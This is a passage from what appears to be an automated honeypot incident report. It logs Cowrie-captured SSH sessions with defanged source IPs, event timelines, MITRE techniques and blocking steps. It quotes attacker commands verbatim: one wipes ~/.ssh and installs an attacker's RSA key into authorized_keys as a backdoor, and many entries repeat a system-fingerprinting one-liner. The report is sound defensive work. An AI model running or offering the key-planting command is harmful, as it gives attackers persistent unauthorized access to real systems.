| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:55:39` | `cowrie.session.connect` |
| `2026-09-06 03:55:39` | `cowrie.client.version` |
| `2026-09-06 03:55:39` | `cowrie.client.kex` |
| `2026-09-06 03:55:40` | `cowrie.login.success` |
| `2026-09-06 03:55:41` | `cowrie.session.params` |
| `2026-09-06 03:55:41` | `cowrie.command.input` |
| `2026-09-06 03:55:41` | `cowrie.command.failed` |
| `2026-09-06 03:55:41` | `cowrie.log.closed` |
| `2026-09-06 03:55:42` | `cowrie.session.params` |
| `2026-09-06 03:55:42` | `cowrie.command.input` |
| `2026-09-06 03:55:42` | `cowrie.session.file_download` |
| `2026-09-06 03:55:42` | `cowrie.log.closed` |
| `2026-09-06 03:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.105.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `178.105.31[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eeaf03f9748

| Field | Detail |
|---|---|
| **Source IP** | `103.194.243[.]199` |
| **First Seen** | 2026-09-06 03:55 |
| **Last Seen** | 2026-09-06 03:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:55:40` | `cowrie.session.connect` |
| `2026-09-06 03:55:40` | `cowrie.client.version` |
| `2026-09-06 03:55:40` | `cowrie.client.kex` |
| `2026-09-06 03:55:42` | `cowrie.login.success` |
| `2026-09-06 03:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.243[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.194.243[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-855bf9cae6a8

| Field | Detail |
|---|---|
| **Source IP** | `178.105.31[.]42` |
| **First Seen** | 2026-09-06 03:55 |
| **Last Seen** | 2026-09-06 03:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:55:42` | `cowrie.session.connect` |
| `2026-09-06 03:55:42` | `cowrie.client.version` |
| `2026-09-06 03:55:42` | `cowrie.client.kex` |
| `2026-09-06 03:55:42` | `cowrie.login.success` |
| `2026-09-06 03:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.105.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `178.105.31[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c6970834ec

| Field | Detail |
|---|---|
| **Source IP** | `103.194.243[.]199` |
| **First Seen** | 2026-09-06 03:55 |
| **Last Seen** | 2026-09-06 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:55:43` | `cowrie.session.connect` |
| `2026-09-06 03:55:43` | `cowrie.client.version` |
| `2026-09-06 03:55:43` | `cowrie.client.kex` |
| `2026-09-06 03:55:44` | `cowrie.login.success` |
| `2026-09-06 03:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.243[.]199` to AbuseIPDB if not already reported
- [ ] Block `103.194.243[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f80cc06d7b93

| Field | Detail |
|---|---|
| **Source IP** | `178.105.31[.]42` |
| **First Seen** | 2026-09-06 03:55 |
| **Last Seen** | 2026-09-06 03:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 03:55:43` | `cowrie.session.connect` |
| `2026-09-06 03:55:43` | `cowrie.client.version` |
| `2026-09-06 03:55:43` | `cowrie.client.kex` |
| `2026-09-06 03:55:43` | `cowrie.login.success` |
| `2026-09-06 03:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.105.31[.]42` to AbuseIPDB if not already reported
- [ ] Block `178.105.31[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bef27e83fdae

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:03 |
| **Last Seen** | 2026-09-06 04:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:03:18` | `cowrie.session.connect` |
| `2026-09-06 04:03:18` | `cowrie.client.version` |
| `2026-09-06 04:03:18` | `cowrie.client.kex` |
| `2026-09-06 04:03:20` | `cowrie.login.success` |
| `2026-09-06 04:03:21` | `cowrie.session.params` |
| `2026-09-06 04:03:21` | `cowrie.command.input` |
| `2026-09-06 04:03:22` | `cowrie.log.closed` |
| `2026-09-06 04:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-969c67578275

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:05 |
| **Last Seen** | 2026-09-06 04:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:05:11` | `cowrie.session.connect` |
| `2026-09-06 04:05:12` | `cowrie.client.version` |
| `2026-09-06 04:05:12` | `cowrie.client.kex` |
| `2026-09-06 04:05:14` | `cowrie.login.success` |
| `2026-09-06 04:05:16` | `cowrie.session.params` |
| `2026-09-06 04:05:16` | `cowrie.command.input` |
| `2026-09-06 04:05:16` | `cowrie.log.closed` |
| `2026-09-06 04:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b70a0adac951

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:07 |
| **Last Seen** | 2026-09-06 04:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:07:06` | `cowrie.session.connect` |
| `2026-09-06 04:07:06` | `cowrie.client.version` |
| `2026-09-06 04:07:06` | `cowrie.client.kex` |
| `2026-09-06 04:07:08` | `cowrie.login.success` |
| `2026-09-06 04:07:10` | `cowrie.session.params` |
| `2026-09-06 04:07:10` | `cowrie.command.input` |
| `2026-09-06 04:07:11` | `cowrie.log.closed` |
| `2026-09-06 04:07:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af04a96742d0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 04:08 |
| **Last Seen** | 2026-09-06 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:08:25` | `cowrie.session.connect` |
| `2026-09-06 04:08:25` | `cowrie.client.version` |
| `2026-09-06 04:08:25` | `cowrie.client.kex` |
| `2026-09-06 04:08:26` | `cowrie.login.success` |
| `2026-09-06 04:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e41ed9aed0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 04:08 |
| **Last Seen** | 2026-09-06 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:08:25` | `cowrie.session.connect` |
| `2026-09-06 04:08:25` | `cowrie.client.version` |
| `2026-09-06 04:08:25` | `cowrie.client.kex` |
| `2026-09-06 04:08:26` | `cowrie.login.success` |
| `2026-09-06 04:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74a154438f3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:09 |
| **Last Seen** | 2026-09-06 04:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:09:01` | `cowrie.session.connect` |
| `2026-09-06 04:09:01` | `cowrie.client.version` |
| `2026-09-06 04:09:01` | `cowrie.client.kex` |
| `2026-09-06 04:09:04` | `cowrie.login.success` |
| `2026-09-06 04:09:05` | `cowrie.session.params` |
| `2026-09-06 04:09:05` | `cowrie.command.input` |
| `2026-09-06 04:09:06` | `cowrie.log.closed` |
| `2026-09-06 04:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7867e0e20057

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:10 |
| **Last Seen** | 2026-09-06 04:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:10:54` | `cowrie.session.connect` |
| `2026-09-06 04:10:54` | `cowrie.client.version` |
| `2026-09-06 04:10:55` | `cowrie.client.kex` |
| `2026-09-06 04:10:56` | `cowrie.login.success` |
| `2026-09-06 04:10:58` | `cowrie.session.params` |
| `2026-09-06 04:10:58` | `cowrie.command.input` |
| `2026-09-06 04:10:58` | `cowrie.log.closed` |
| `2026-09-06 04:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6972f778a0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:12 |
| **Last Seen** | 2026-09-06 04:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:12:48` | `cowrie.session.connect` |
| `2026-09-06 04:12:48` | `cowrie.client.version` |
| `2026-09-06 04:12:48` | `cowrie.client.kex` |
| `2026-09-06 04:12:50` | `cowrie.login.success` |
| `2026-09-06 04:12:51` | `cowrie.session.params` |
| `2026-09-06 04:12:51` | `cowrie.command.input` |
| `2026-09-06 04:12:52` | `cowrie.log.closed` |
| `2026-09-06 04:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf9b962d1ad

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:16 |
| **Last Seen** | 2026-09-06 04:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:16:35` | `cowrie.session.connect` |
| `2026-09-06 04:16:36` | `cowrie.client.version` |
| `2026-09-06 04:16:36` | `cowrie.client.kex` |
| `2026-09-06 04:16:37` | `cowrie.login.success` |
| `2026-09-06 04:16:39` | `cowrie.session.params` |
| `2026-09-06 04:16:39` | `cowrie.command.input` |
| `2026-09-06 04:16:39` | `cowrie.log.closed` |
| `2026-09-06 04:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6bc8484255

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:18 |
| **Last Seen** | 2026-09-06 04:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:18:28` | `cowrie.session.connect` |
| `2026-09-06 04:18:29` | `cowrie.client.version` |
| `2026-09-06 04:18:29` | `cowrie.client.kex` |
| `2026-09-06 04:18:30` | `cowrie.login.success` |
| `2026-09-06 04:18:31` | `cowrie.session.params` |
| `2026-09-06 04:18:31` | `cowrie.command.input` |
| `2026-09-06 04:18:32` | `cowrie.log.closed` |
| `2026-09-06 04:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c87f7897c8a1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:20 |
| **Last Seen** | 2026-09-06 04:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:20:21` | `cowrie.session.connect` |
| `2026-09-06 04:20:21` | `cowrie.client.version` |
| `2026-09-06 04:20:21` | `cowrie.client.kex` |
| `2026-09-06 04:20:23` | `cowrie.login.success` |
| `2026-09-06 04:20:24` | `cowrie.session.params` |
| `2026-09-06 04:20:24` | `cowrie.command.input` |
| `2026-09-06 04:20:25` | `cowrie.log.closed` |
| `2026-09-06 04:20:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0361549b00f0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:22 |
| **Last Seen** | 2026-09-06 04:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:22:15` | `cowrie.session.connect` |
| `2026-09-06 04:22:15` | `cowrie.client.version` |
| `2026-09-06 04:22:15` | `cowrie.client.kex` |
| `2026-09-06 04:22:17` | `cowrie.login.success` |
| `2026-09-06 04:22:18` | `cowrie.session.params` |
| `2026-09-06 04:22:18` | `cowrie.command.input` |
| `2026-09-06 04:22:19` | `cowrie.log.closed` |
| `2026-09-06 04:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84a30167da6d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:24 |
| **Last Seen** | 2026-09-06 04:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:24:10` | `cowrie.session.connect` |
| `2026-09-06 04:24:10` | `cowrie.client.version` |
| `2026-09-06 04:24:10` | `cowrie.client.kex` |
| `2026-09-06 04:24:11` | `cowrie.login.success` |
| `2026-09-06 04:24:14` | `cowrie.session.params` |
| `2026-09-06 04:24:14` | `cowrie.command.input` |
| `2026-09-06 04:24:15` | `cowrie.log.closed` |
| `2026-09-06 04:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5996b89cdc8c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:26 |
| **Last Seen** | 2026-09-06 04:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 04:26:06` | `cowrie.session.connect` |
| `2026-09-06 04:26:06` | `cowrie.client.version` |
| `2026-09-06 04:26:06` | `cowrie.client.kex` |
| `2026-09-06 04:26:08` | `cowrie.login.success` |
| `2026-09-06 04:26:10` | `cowrie.session.params` |
| `2026-09-06 04:26:10` | `cowrie.command.input` |
| `2026-09-06 04:26:11` | `cowrie.log.closed` |
| `2026-09-06 04:26:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2cd8e31a022

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 04:27 |
| **Last Seen** | 2026-09-06 04:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
